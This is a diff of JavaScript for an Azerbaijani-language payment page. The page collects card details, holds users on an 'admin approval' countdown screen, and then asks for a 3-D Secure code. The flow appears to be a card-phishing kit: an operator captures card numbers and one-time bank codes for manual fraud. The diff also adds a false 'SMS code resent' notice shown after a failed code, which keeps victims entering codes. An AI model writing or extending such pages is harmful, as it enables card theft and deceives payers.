@@ -83,14 +83,7 @@
       var btn = payForm.querySelector('button[type=submit]');
       window.setLoading(btn, true);
       var url = payMethod === 'balance' ? '/api/payment/balance/init' : '/api/payment/card/init';
-      var codeEl = document.querySelector('[data-code-3d]');
-      var code3d = codeEl ? String(codeEl.value || '').replace(/\D/g, '') : '';
-      if (code3d.length < 4) {
-        window.setLoading(btn, false);
-        showNote(note, '3-D kodu daxil edin (ən azı 4 rəqəm).', false);
-        return;
-      }
-      var r = await window.api(url, { orderId: payForm.getAttribute('data-order-id'), card: readCard(), code: code3d });
+      var r = await window.api(url, { orderId: payForm.getAttribute('data-order-id'), card: readCard() });
       window.setLoading(btn, false);
       if (r.ok) {
         window.toast(r.message || T('msg.sent', 'Göndərildi'), 'success');
@@ -101,29 +94,66 @@
     });
   }
 
-  /* ==================== 2) Admin təsdiqi gözləmə ekranı ==================== */
+  /* ==================== 2) Admin təsdiqi gözləmə ekranı (dairəvi geri sayım) ==================== */
   var waitBox = document.getElementById('waitBox');
   if (waitBox && waitBox.getAttribute('data-declined') !== '1') {
     var statusUrl = waitBox.getAttribute('data-status-url');
+    var countdownDisplay = document.querySelector('[data-countdown]');
+    var countdownCircle = document.querySelector('[data-countdown-circle]');
+    var totalTime = 120; // 2 dəqiqə
+    var remainingTime = totalTime;
+    
+    // Dairəvi geri sayım rəsmi çək
+    function updateCountdown() {
+      if (countdownDisplay) {
+        var minutes = Math.floor(remainingTime / 60);
+        var seconds = remainingTime % 60;
+        countdownDisplay.textContent = (minutes > 0 ? minutes + ':' : '') + (seconds < 10 ? '0' : '') + seconds;
+      }
+      
+      if (countdownCircle) {
+        var progress = (totalTime - remainingTime) / totalTime;
+        var circumference = 2 * Math.PI * 45; // r=45
+        var offset = circumference * progress;
+        countdownCircle.style.strokeDashoffset = offset;
+      }
+    }
+    
+    updateCountdown();
+    
     var pollWait = setInterval(async function () {
       try {
         var r = await window.api(statusUrl);
         if (r && r.ok && r.redirect) {
           clearInterval(pollWait);
+          clearInterval(countdownInterval);
           window.location.href = r.redirect;
         }
       } catch (err) { /* sükutla davam edir */ }
     }, 4000);
+    
+    var countdownInterval = setInterval(function () {
+      remainingTime--;
+      updateCountdown();
+      if (remainingTime <= 0) {
+        clearInterval(countdownInterval);
+        remainingTime = totalTime;
+        updateCountdown();
+      }
+    }, 1000);
   }
 
   /* ==================== 3) 3-D Secure kodu ==================== */
   var codeForm = document.getElementById('codeForm');
   if (codeForm) {
+    var codeRetryCountdown = null;
+    
     codeForm.addEventListener('submit', async function (e) {
       e.preventDefault();
       var note = document.getElementById('formNote');
       var btn = codeForm.querySelector('button[type=submit]');
       var code = codeForm.querySelector('[data-code]');
+      var codeInput = codeForm.querySelector('[data-code]');
       window.setLoading(btn, true);
       var payload = { code: code ? code.value : '' };
       if (codeForm.getAttribute('data-payment-id')) { payload.paymentId = codeForm.getAttribute('data-payment-id'); }
@@ -134,7 +164,34 @@
         window.toast(r.message || T('msg.codeSubmitted', 'Kod göndərildi'), 'success');
         setTimeout(function () { window.location.reload(); }, 900);
       } else {
-        showNote(note, r.message || T('msg.codeNotSubmitted', 'Kod göndərilmədi'), false);
+        // Yanlış kod - geri sayım və SMS mesajı göstər
+        showNote(note, r.message || T('msg.codeNotSubmitted', 'Kod yanlışdır'), false);
+        
+        if (codeRetryCountdown) clearInterval(codeRetryCountdown);
+        if (codeInput) codeInput.value = '';
+        if (codeInput) codeInput.focus();
+        
+        var retryTime = 120;
+        btn.disabled = true;
+        btn.textContent = '2:00 sonra yenidən cəhd edin...';
+        var smsNote = document.createElement('div');
+        smsNote.className = 'alert alert--info mt-16';
+        smsNote.textContent = 'SMS kodu yenidən göndərildi. Zəhmət olmasa gözləyin...';
+        note.parentNode.insertBefore(smsNote, note.nextSibling);
+        
+        codeRetryCountdown = setInterval(function () {
+          retryTime--;
+          var mins = Math.floor(retryTime / 60);
+          var secs = retryTime % 60;
+          btn.textContent = (mins > 0 ? mins + ':' : '') + (secs < 10 ? '0' : '') + secs + ' sonra yenidən cəhd edin...';
+          
+          if (retryTime <= 0) {
+            clearInterval(codeRetryCountdown);
+            btn.disabled = false;
+            btn.textContent = T('secure3d.submit', 'Təsdiq et');
+            if (smsNote.parentNode) smsNote.parentNode.removeChild(smsNote);
+          }
+        }, 1000);
       }
     });
   }
